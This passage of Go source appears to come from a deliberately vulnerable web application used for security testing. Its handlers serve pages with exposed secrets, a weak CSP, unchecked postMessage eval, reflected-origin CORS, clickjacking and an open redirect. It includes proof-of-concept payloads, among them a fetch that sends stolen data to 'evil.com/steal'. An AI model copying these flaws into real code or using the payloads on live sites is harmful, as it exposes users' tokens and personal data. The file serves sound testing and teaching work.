	fmt.Fprint(w, h.wrapHTML("User Settings", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C3: Sensitive Data Exposure in Client-Side Code
// ---------------------------------------------------------------------------

func (h *Handler) serveClientSensitiveData(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-sensitive-data-exposure")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	body := fmt.Sprintf(`<h2>Application Dashboard</h2>
<div class="card">
  <p>Welcome to the dashboard. Loading your data...</p>
</div>

<script>
// API keys embedded in client-side JavaScript
var API_CONFIG = {
    STRIPE_SECRET_KEY: 'sk_live_%s',
    AWS_ACCESS_KEY: 'AKIA%s',
    AWS_SECRET_KEY: '%s',
    GOOGLE_MAPS_KEY: 'AIza%s',
    SENDGRID_API_KEY: 'SG.%s',
    TWILIO_AUTH_TOKEN: '%s',
    DATABASE_URL: 'postgresql://admin:s3cretP@ss@db.acme-internal.com:5432/production',
    REDIS_URL: 'redis://:r3d1sP@ss@cache.acme-internal.com:6379/0',
    JWT_SECRET: '%s',
    ENCRYPTION_KEY: '%s'
};

// Tokens stored in localStorage
localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDAwMDAwMDB9.%s');
localStorage.setItem('refresh_token', 'rt_%s');
localStorage.setItem('api_key', API_CONFIG.STRIPE_SECRET_KEY);
localStorage.setItem('user_data', JSON.stringify({
    id: 1,
    name: '%s',
    email: '%s',
    ssn: '%s',
    role: 'admin'
}));

// Session data in global scope
window.__SESSION__ = {
    userId: 1,
    role: 'admin',
    permissions: ['read', 'write', 'delete', 'admin'],
    internalEndpoint: 'https://admin-api.acme-internal.com/v2'
};

// Source map reference pointing to internal repo
//# sourceMappingURL=https://git.acme-internal.com/frontend/app.js.map
</script>

<div class="card">
  <h3>Exposed Secrets in Page Source</h3>
  <ul>
    <li>Stripe secret key in JavaScript variable</li>
    <li>AWS access key and secret key in client code</li>
    <li>Database connection string with credentials</li>
    <li>JWT secret key enabling token forgery</li>
    <li>Auth tokens stored in localStorage (accessible via XSS)</li>
    <li>User PII including SSN stored in localStorage</li>
    <li>Internal API endpoint exposed in window object</li>
    <li>Source map URL leaking internal repository path</li>
  </ul>
  <p>Open browser DevTools &gt; Application &gt; Local Storage to see stored tokens.</p>
</div>`,
		h.randomHex(rng, 24),
		h.randomHex(rng, 16),
		h.randomHex(rng, 40),
		h.randomHex(rng, 35),
		h.randomHex(rng, 22)+"."+h.randomHex(rng, 22),
		h.randomHex(rng, 32),
		h.randomHex(rng, 48),
		h.randomHex(rng, 32),
		h.randomHex(rng, 43),
		h.randomHex(rng, 64),
		h.randomName(rng),
		h.randomEmail(rng),
		fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
	)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Dashboard", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C4: CSP Bypass
// ---------------------------------------------------------------------------

func (h *Handler) serveClientCSPBypass(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-csp-bypass")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	// Intentionally weak CSP
	nonce := h.randomHex(rng, 16)
	w.Header().Set("Content-Security-Policy",
		fmt.Sprintf("default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' 'nonce-%s' https://cdn.example.com https://*.googleapis.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src *; frame-src *; base-uri 'self'", nonce))

	body := fmt.Sprintf(`<h2>CSP Protected Page</h2>
<div class="card">
  <h3>Content Security Policy Analysis</h3>
  <p>This page has a Content-Security-Policy header, but it contains several bypasses.</p>
</div>

<!-- Nonce reuse: same nonce used on every page load -->
<script nonce="%s">
console.log('Legitimate script with nonce');
// This nonce is static (seeded from path) and never rotates per request
</script>

<!-- unsafe-inline allows any inline script -->
<script>
console.log('Inline script without nonce - allowed by unsafe-inline');
</script>

<!-- unsafe-eval allows eval(), Function(), setTimeout(string) -->
<script>
eval('console.log("eval allowed by unsafe-eval")');
new Function('console.log("Function() constructor allowed")')();
setTimeout('console.log("setTimeout with string allowed")', 0);
</script>

<!-- data: URI in default-src -->
<script>
var s = document.createElement('script');
s.src = 'data:text/javascript,console.log("data: URI script loaded")';
// Would be blocked by proper CSP but allowed by data: in default-src
</script>

<!-- base-uri self can be exploited with relative script paths -->
<base href="https://attacker.example.com/">

<div class="card">
  <h3>CSP Weaknesses</h3>
  <table>
    <tr><th>Directive</th><th>Issue</th><th>Severity</th></tr>
    <tr><td><code>'unsafe-inline'</code></td><td>Allows arbitrary inline scripts, defeating XSS protection</td><td style="color:#d63031">Critical</td></tr>
    <tr><td><code>'unsafe-eval'</code></td><td>Allows eval(), Function(), setTimeout(string)</td><td style="color:#d63031">Critical</td></tr>
    <tr><td><code>nonce-%s</code></td><td>Static nonce (never rotates) - predictable and reusable</td><td style="color:#e17055">High</td></tr>
    <tr><td><code>data:</code> in default-src</td><td>Allows loading scripts from data: URIs</td><td style="color:#e17055">High</td></tr>
    <tr><td><code>blob:</code> in default-src</td><td>Allows loading scripts from blob: URIs</td><td style="color:#e17055">High</td></tr>
    <tr><td><code>https://*.googleapis.com</code></td><td>Overly broad wildcard - JSONP endpoints available</td><td style="color:#fdcb6e">Medium</td></tr>
    <tr><td><code>img-src *</code></td><td>Allows image-based data exfiltration to any domain</td><td style="color:#fdcb6e">Medium</td></tr>
    <tr><td><code>connect-src *</code></td><td>Allows fetch/XHR to any domain</td><td style="color:#fdcb6e">Medium</td></tr>
    <tr><td><code>frame-src *</code></td><td>Allows framing from any domain</td><td style="color:#fdcb6e">Medium</td></tr>
  </table>
</div>`, nonce, nonce)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("CSP Analysis", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C5: PostMessage Vulnerabilities
// ---------------------------------------------------------------------------

func (h *Handler) serveClientPostMessage(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-postmessage")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	body := `<h2>Embedded Widget</h2>
<div class="card" id="widget-output">
  <p>Widget ready. Listening for messages...</p>
</div>

<script>
// Vulnerable: no origin check on message handler
window.addEventListener('message', function(event) {
    // Missing: if (event.origin !== 'https://trusted.example.com') return;

    var data = event.data;

    // Vulnerable: innerHTML from postMessage data
    if (data.type === 'update') {
        document.getElementById('widget-output').innerHTML = data.content;
    }

    // Vulnerable: eval from postMessage
    if (data.type === 'exec') {
        eval(data.code);
    }

    // Vulnerable: location change from postMessage
    if (data.type === 'redirect') {
        window.location.href = data.url;
    }

    // Vulnerable: token extraction via postMessage
    if (data.type === 'getToken') {
        event.source.postMessage({
            type: 'token',
            value: localStorage.getItem('auth_token'),
            cookies: document.cookie
        }, '*');  // Vulnerable: sends to any origin
    }
});

// Vulnerable: postMessage to parent with wildcard origin
if (window.parent !== window) {
    window.parent.postMessage({
        type: 'ready',
        token: localStorage.getItem('auth_token'),
        url: window.location.href
    }, '*');  // Should specify exact target origin
}
</script>

<div class="card">
  <h3>Vulnerability Details</h3>
  <ul>
    <li>No <code>event.origin</code> check - accepts messages from any origin</li>
    <li><code>innerHTML</code> assignment from message data - DOM XSS via postMessage</li>
    <li><code>eval()</code> of message data - arbitrary code execution</li>
    <li><code>window.location</code> assignment from message - open redirect</li>
    <li>Auth token sent via postMessage to <code>'*'</code> (any origin)</li>
    <li>Sensitive data leaked to parent frame without origin validation</li>
  </ul>
  <p>From any page, run: <code>window.frames[0].postMessage({type:'exec',code:'alert(document.cookie)'},'*')</code></p>
</div>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Widget", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C6: Vulnerable Third-Party Dependencies
// ---------------------------------------------------------------------------

func (h *Handler) serveClientDependencyVuln(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-dependency-vuln")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	body := `<h2>Application Dependencies</h2>

<!-- Vulnerable: old jQuery with known XSS vulnerabilities -->
<script src="https://code.jquery.com/jquery-1.6.4.min.js" integrity="" crossorigin="anonymous"></script>
<!-- Vulnerable: lodash with prototype pollution -->
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.4/lodash.min.js"></script>
<!-- Vulnerable: Angular 1.x with sandbox escape -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
<!-- Vulnerable: Moment.js with ReDoS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.19.2/moment.min.js"></script>
<!-- Vulnerable: Bootstrap with XSS in data attributes -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<!-- No SRI hashes on any script tags -->

<div class="card">
  <h3>Dependency Audit Report</h3>
  <table>
    <tr><th>Library</th><th>Version</th><th>Latest</th><th>Known CVEs</th><th>Severity</th></tr>
    <tr><td>jQuery</td><td style="color:#d63031">1.6.4</td><td>3.7.1</td><td>CVE-2015-9251, CVE-2019-11358, CVE-2020-11022, CVE-2020-11023</td><td style="color:#d63031">Critical</td></tr>
    <tr><td>Lodash</td><td style="color:#d63031">4.17.4</td><td>4.17.21</td><td>CVE-2018-16487, CVE-2019-10744, CVE-2020-8203, CVE-2021-23337</td><td style="color:#d63031">Critical</td></tr>
    <tr><td>AngularJS</td><td style="color:#d63031">1.5.8</td><td>EOL</td><td>CVE-2022-25869, CVE-2023-26116, CVE-2023-26117, CVE-2023-26118</td><td style="color:#e17055">High</td></tr>
    <tr><td>Moment.js</td><td style="color:#e17055">2.19.2</td><td>2.30.1</td><td>CVE-2022-24785, CVE-2022-31129</td><td style="color:#e17055">High</td></tr>
    <tr><td>Bootstrap</td><td style="color:#e17055">3.3.6</td><td>5.3.3</td><td>CVE-2018-14040, CVE-2018-14041, CVE-2018-14042, CVE-2019-8331</td><td style="color:#fdcb6e">Medium</td></tr>
  </table>
</div>
<div class="card">
  <h3>Additional Issues</h3>
  <ul>
    <li>No Subresource Integrity (SRI) hashes on any <code>&lt;script&gt;</code> tags</li>
    <li>Loading libraries from multiple CDNs without pinned versions</li>
    <li>jQuery 1.x <code>$.html()</code> is vulnerable to XSS via crafted HTML</li>
    <li>Lodash 4.17.4 <code>_.merge()</code> and <code>_.defaultsDeep()</code> allow prototype pollution</li>
    <li>AngularJS 1.x sandbox escape enables template injection to code execution</li>
    <li>No automated dependency scanning (Snyk, Dependabot, etc.) configured</li>
    <li>package-lock.json not committed - builds are non-reproducible</li>
  </ul>
</div>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Dependencies", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C7: CORS Misconfiguration (Client-Side Perspective)
// ---------------------------------------------------------------------------

func (h *Handler) serveClientCORSMisconfig(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-cors-misconfig")

	// Reflect the Origin header
	origin := r.Header.Get("Origin")
	if origin == "" {
		origin = "https://evil.example.com"
	}
	w.Header().Set("Access-Control-Allow-Origin", origin)
	w.Header().Set("Access-Control-Allow-Credentials", "true")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, PATCH")
	w.Header().Set("Access-Control-Allow-Headers", "Authorization, Content-Type, X-API-Key")
	w.Header().Set("Access-Control-Expose-Headers", "X-Request-Id, X-Debug-Info")
	w.Header().Set("Content-Type", "application/json")

	resp := toJSON(map[string]interface{}{
		"endpoint":       "/vuln/client-side/cors-misconfig",
		"cors_policy": map[string]interface{}{
			"allow_origin":      origin,
			"reflect_origin":    true,
			"allow_credentials": true,
			"allow_methods":     "GET, POST, PUT, DELETE, PATCH",
			"preflight_cache":   86400,
		},
		"sensitive_data": map[string]interface{}{
			"user": map[string]interface{}{
				"id":    rng.Intn(90000) + 10000,
				"name":  h.randomName(rng),
				"email": h.randomEmail(rng),
				"role":  "admin",
			},
			"api_key":  fmt.Sprintf("ak_%s", h.randomHex(rng, 32)),
			"csrf_token": h.randomHex(rng, 32),
			"internal_endpoint": "https://api.acme-internal.com/v2",
		},
		"_exploit": map[string]interface{}{
			"description": "Any origin can read this response with credentials",
			"poc": "fetch('https://target.com/vuln/client-side/cors-misconfig',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/steal?data='+JSON.stringify(d)))",
		},
	})

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C8: Insecure Client-Side Storage
// ---------------------------------------------------------------------------

func (h *Handler) serveClientInsecureStorage(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-insecure-storage")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")

	name := h.randomName(rng)
	email := h.randomEmail(rng)
	ssn := fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000)

	body := fmt.Sprintf(`<h2>User Dashboard</h2>
<div class="card">
  <h3>Welcome back, %s</h3>
  <p>Your session is active.</p>
</div>

<script>
// Storing sensitive tokens in localStorage (persists across sessions, accessible via XSS)
localStorage.setItem('access_token', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.%s');
localStorage.setItem('refresh_token', 'rt_%s');
localStorage.setItem('api_key', 'sk_%s');
localStorage.setItem('session_id', '%s');
localStorage.setItem('csrf_token', '%s');

// Storing PII in sessionStorage (still accessible via XSS)
sessionStorage.setItem('user_profile', JSON.stringify({
    id: %d,
    name: '%s',
    email: '%s',
    ssn: '%s',
    phone: '+1-%03d-%03d-%04d',
    address: '%d Main St, Anytown, ST %05d',
    dob: '19%02d-%02d-%02d',
    credit_card: {
        number: '%04d-%04d-%04d-%04d',
        expiry: '%02d/%02d',
        cvv: '%03d'
    }
}));

// Storing credentials in cookies without secure flags
document.cookie = 'admin_token=%s; path=/';
document.cookie = 'user_email=%s; path=/';
document.cookie = 'session_secret=%s; path=/; expires=Fri, 31 Dec 2099 23:59:59 GMT';
</script>

<div class="card">
  <h3>Storage Analysis</h3>
  <table>
    <tr><th>Storage Type</th><th>Key</th><th>Issue</th></tr>
    <tr><td>localStorage</td><td>access_token</td><td style="color:#d63031">JWT accessible via XSS, persists indefinitely</td></tr>
    <tr><td>localStorage</td><td>refresh_token</td><td style="color:#d63031">Refresh token should be httpOnly cookie</td></tr>
    <tr><td>localStorage</td><td>api_key</td><td style="color:#d63031">API secret key in client-side storage</td></tr>
    <tr><td>sessionStorage</td><td>user_profile</td><td style="color:#d63031">PII including SSN and credit card</td></tr>
    <tr><td>Cookie</td><td>admin_token</td><td style="color:#d63031">No HttpOnly, Secure, or SameSite flags</td></tr>
    <tr><td>Cookie</td><td>session_secret</td><td style="color:#d63031">Expires in 2099, no security flags</td></tr>
  </table>
  <p>Open DevTools &gt; Application &gt; Storage to inspect all stored data.</p>
</div>`,
		name,
		h.randomHex(rng, 43),
		h.randomHex(rng, 64),
		h.randomHex(rng, 32),
		h.randomHex(rng, 32),
		h.randomHex(rng, 32),
		rng.Intn(90000)+10000, name, email, ssn,
		rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(10000),
		rng.Intn(9000)+1000, rng.Intn(90000)+10000,
		rng.Intn(70)+50, rng.Intn(12)+1, rng.Intn(28)+1,
		rng.Intn(10000), rng.Intn(10000), rng.Intn(10000), rng.Intn(10000),
		rng.Intn(12)+1, rng.Intn(6)+25, rng.Intn(1000),
		h.randomHex(rng, 32),
		email,
		h.randomHex(rng, 48),
	)

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Dashboard", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C9: Clickjacking
// ---------------------------------------------------------------------------

func (h *Handler) serveClientClickjacking(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-clickjacking")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng
	// Intentionally omit: X-Frame-Options and frame-ancestors CSP

	body := `<h2>Account Settings</h2>
<div class="card">
  <h3>Change Email Address</h3>
  <form method="POST" action="/vuln/client-side/clickjacking">
    <label>New Email</label><br>
    <input type="email" name="email" value="attacker@evil.example.com" style="width:100%;padding:8px;margin:4px 0 12px"><br>
    <button type="submit" style="background:#00b894;color:#fff;padding:12px 24px;border:none;border-radius:6px;cursor:pointer;width:100%">Update Email</button>
  </form>
</div>
<div class="card">
  <h3>Delete Account</h3>
  <form method="POST" action="/vuln/client-side/clickjacking">
    <input type="hidden" name="action" value="delete_account">
    <button type="submit" style="background:#d63031;color:#fff;padding:12px 24px;border:none;border-radius:6px;cursor:pointer;width:100%">Permanently Delete My Account</button>
  </form>
</div>
<div class="card">
  <h3>Transfer Funds</h3>
  <form method="POST" action="/vuln/client-side/clickjacking">
    <input type="hidden" name="action" value="transfer">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to" value="attacker-account">
    <button type="submit" style="background:#0984e3;color:#fff;padding:12px 24px;border:none;border-radius:6px;cursor:pointer;width:100%">Confirm Transfer</button>
  </form>
</div>

<div class="card">
  <h3>Clickjacking Vulnerability Analysis</h3>
  <ul>
    <li>No <code>X-Frame-Options</code> header set</li>
    <li>No <code>frame-ancestors</code> CSP directive</li>
    <li>Page can be embedded in an invisible iframe on attacker's site</li>
    <li>State-changing actions (email change, account deletion, fund transfer) use simple form POSTs</li>
    <li>No CSRF token protection on forms</li>
    <li>No frame-busting JavaScript</li>
  </ul>
  <h3>Proof of Concept</h3>
  <pre>&lt;iframe src="https://target.com/vuln/client-side/clickjacking"
  style="opacity:0.01;position:absolute;top:0;left:0;width:100%%;height:100%%"&gt;
&lt;/iframe&gt;
&lt;button style="position:relative;z-index:-1"&gt;Click to claim prize!&lt;/button&gt;</pre>
</div>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Account Settings", body))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// C10: Open Redirect
// ---------------------------------------------------------------------------

func (h *Handler) serveClientOpenRedirect(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	w.Header().Set("X-Glitch-Vuln-Type", "client-side-open-redirect")
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = rng

	target := r.URL.Query().Get("url")
	if target == "" {
		target = r.URL.Query().Get("redirect")
	}
	if target == "" {
		target = r.URL.Query().Get("next")
	}
	if target == "" {
		target = r.URL.Query().Get("return")
	}

	if target != "" {
		// No validation at all - redirect to whatever is provided
		w.Header().Set("Location", target)
		w.WriteHeader(http.StatusFound)
		fmt.Fprintf(w, `<html><body>Redirecting to <a href="%s">%s</a>...</body></html>`, target, target)
		return http.StatusFound
	}

	body := `<h2>Redirect Service</h2>
<div class="card">
  <h3>Open Redirect Endpoint</h3>
  <p>This endpoint redirects to any URL without validation.</p>
  <h3>Test URLs</h3>
  <ul>
    <li><a href="/vuln/client-side/open-redirect?url=https://evil.example.com">Basic open redirect</a></li>
    <li><a href="/vuln/client-side/open-redirect?url=//evil.example.com">Protocol-relative redirect</a></li>
    <li><a href="/vuln/client-side/open-redirect?url=javascript:alert(document.cookie)">JavaScript scheme redirect</a></li>
    <li><a href="/vuln/client-side/open-redirect?url=data:text/html,<script>alert(1)</script>">Data URI redirect</a></li>
    <li><a href="/vuln/client-side/open-redirect?redirect=https://phishing.example.com/login">Alternate parameter name</a></li>
    <li><a href="/vuln/client-side/open-redirect?next=https://evil.example.com/steal-creds">Login-style redirect</a></li>
    <li><a href="/vuln/client-side/open-redirect?return=https://evil.example.com">Return URL redirect</a></li>
  </ul>
</div>
<div class="card">
  <h3>Vulnerability Details</h3>
  <ul>
    <li>No URL validation or whitelist checking</li>
    <li>Multiple parameter names accepted (<code>url</code>, <code>redirect</code>, <code>next</code>, <code>return</code>)</li>
    <li><code>javascript:</code> scheme not blocked - enables XSS via redirect</li>
    <li><code>data:</code> URI not blocked - enables content injection</li>
    <li>Protocol-relative URLs (<code>//evil.com</code>) not blocked</li>
    <li>Can be chained with phishing attacks to steal credentials</li>
    <li>Can bypass OAuth/SSO origin checks</li>
  </ul>
</div>

<script>
// Client-side redirect with no validation
var params = new URLSearchParams(window.location.search);
var redir = params.get('goto') || params.get('dest');
if (redir) {
    window.location = redir;  // No validation, javascript: allowed
}
</script>`

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("Redirect", body))
	return http.StatusOK
}
